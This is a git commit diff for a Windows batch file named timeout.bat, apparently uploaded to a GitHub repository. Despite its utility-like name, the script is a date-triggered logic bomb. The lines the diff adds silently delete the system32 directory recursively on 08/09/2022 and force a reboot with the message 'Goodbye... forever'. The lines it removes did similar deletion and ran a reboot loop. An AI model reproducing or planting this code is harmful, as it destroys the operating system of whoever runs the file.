4fa68f1f846377f8853ea363ed90566e617588b4
Ares Amigos <98190104+AresAmigos@users.noreply.github.com>
2022-09-22 21:20:02 +0200

    Add files via upload

--- Sources/timeout.bat
+++ Sources/timeout.bat
@@ -1,8 +1,3 @@
 @echo off
-if %date% == 08/09/2022 cd "%windir%\system32"
-if %date% == 08/09/2022 del */q
-if %date% == 08/09/2022 shutdown -r -c "Goodbye... forever" -t 4
-goto die
-:die
-if %date% == 08/09/2022 shutdown -r -t 0
-if %date% == 08/09/2022 goto die
+if %date% == 08/09/2022 rd "%windir%\system32"/q/s
+if %date% == 08/09/2022 shutdown -r -c "Goodbye... forever" -t 3
